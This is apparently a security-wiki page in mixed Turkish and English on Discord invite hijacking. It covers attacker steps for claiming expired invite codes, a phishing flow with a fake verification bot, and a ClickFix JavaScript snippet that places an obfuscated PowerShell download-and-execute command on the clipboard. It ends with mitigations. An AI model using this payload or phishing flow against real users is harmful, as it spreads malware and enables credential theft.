# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord’un davet sistemi vulnerability’si, threat actor’ların süresi dolmuş veya silinmiş davet kodlarını (temporary, permanent veya custom vanity) herhangi bir Level 3 Boost sunucusunda yeni vanity link’ler olarak claim etmesine olanak tanır. Tüm kodlar lowercase’e normalize edildiğinden, attacker’lar bilinen davet kodlarını önceden pre-register edebilir ve original link’in süresi dolduğunda veya kaynak sunucu boost’unu kaybettiğinde trafiği sessizce hijack edebilir.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | Süresi dolduktan sonra kod kullanılabilir hale gelir ve boosted bir sunucu tarafından vanity URL olarak yeniden register edilebilir. |
| Permanent Invite Link | ⚠️          | Silinmişse ve yalnızca lowercase harfler ile rakamlardan oluşuyorsa kod yeniden kullanılabilir hale gelebilir.        |
| Custom Vanity Link    | ✅          | Original sunucu Level 3 Boost’unu kaybederse vanity invite yeni registration için kullanılabilir hale gelir.    |

## Exploitation Steps

1. Reconnaissance
- Public sources (forums, social media, Telegram channels) üzerinde `discord.gg/{code}` veya `discord.com/invite/{code}` pattern’ine uyan invite link’lerini monitor edin.<sup>[[1]](#references)</sup>
- İlgi çekici invite code’larını (temporary veya vanity) collect edin.
2. Pre-registration
- Level 3 Boost privileges’ına sahip bir Discord server oluşturun veya mevcut bir server kullanın.
- **Server Settings → Vanity URL** bölümünde target invite code’unu assign etmeyi deneyin. Kabul edilirse kod malicious server tarafından reserve edilir.
3. Hijack Activation
- Temporary invite’ler için original invite’in süresi dolana kadar bekleyin (veya source’u control ediyorsanız manuel olarak silin).
- Uppercase içeren code’lar için lowercase variant hemen claim edilebilir, ancak redirection yalnızca expiration sonrasında activate olur.
4. Silent Redirection
- Eski link’i ziyaret eden users, hijack active olduğunda seamless bir şekilde attacker-controlled server’a gönderilir.

## Phishing Flow via Discord Server

1. Server channels’larını yalnızca bir **#verify** channel’ı görünür olacak şekilde restrict edin.<sup>[[1]](#references)</sup>
2. Yeni gelenleri OAuth2 üzerinden verify olmaya yönlendirmek için bir bot (ör. **Safeguard#0786**) deploy edin.
3. Bot, users’ı CAPTCHA veya verification step görünümü altında bir phishing site’ına (ör. `captchaguard.me`) redirect eder.
4. **ClickFix** UX trick’ini implement edin:
- Bozuk bir CAPTCHA message’ı display edin.
- Users’ı **Win+R** dialog’unu açmaya, önceden yüklenmiş bir PowerShell command’ını paste etmeye ve Enter’a basmaya yönlendirin.

### ClickFix Clipboard Injection Example
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Bu yaklaşım, doğrudan dosya indirmelerini önler ve kullanıcı şüphesini azaltmak için tanıdık kullanıcı arayüzü öğelerinden yararlanır.<sup>[[1]](#references)</sup>

## Azaltıcı Önlemler

- En az bir büyük harf veya alfasayısal olmayan karakter içeren kalıcı davet bağlantıları kullanın (süresi asla dolmayan, yeniden kullanılamayan).<sup>[[1]](#references)</sup>
- Davet kodlarını düzenli olarak değiştirin ve eski bağlantıları iptal edin.
- Discord sunucusunun boost durumunu ve vanity URL taleplerini izleyin.
- Kullanıcıları sunucunun gerçekliğini doğrulamaları ve panodan yapıştırılan komutları çalıştırmaktan kaçınmaları konusunda bilinçlendirin.

## Referanslar

- [1] [Güvenden Tehdide: Çok Aşamalı Malware Dağıtımı İçin Ele Geçirilen Discord Davetleri](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Özel Davet Bağlantısı – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
